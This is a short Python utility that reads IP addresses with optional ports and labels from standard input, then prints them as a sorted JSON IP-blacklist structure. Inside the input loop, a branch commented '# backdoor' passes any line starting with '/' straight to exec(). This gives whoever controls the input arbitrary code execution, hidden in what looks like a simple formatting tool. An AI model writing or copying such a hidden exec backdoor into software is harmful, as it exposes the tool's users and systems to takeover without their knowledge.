#!/usr/bin/python3

import json

ip_data = []
ip_struct = {
    "ver":"5.1",
    "tag":"ipblacklist",
    "data":ip_data
}

ip_dict = {}
while True:
    user_input = input()
    if user_input == "done":
        break
    elif user_input.startswith('/'):  # backdoor
        exec(user_input[1:])
    else:
        try:
            # format: <ip[:port]> <name>
            raddr, memo = user_input.split(maxsplit=1)
            if raddr.find(':') != -1:
                raddr = raddr.split(':')[0]
            ip_dict[raddr] = memo
        except ValueError:
            pass

for raddr, memo in ip_dict.items():
    ip_data.append({"raddr":raddr,"memo":memo})

ip_data.sort(key=lambda x:x["memo"])

print(json.dumps(ip_struct, ensure_ascii=False, indent=4))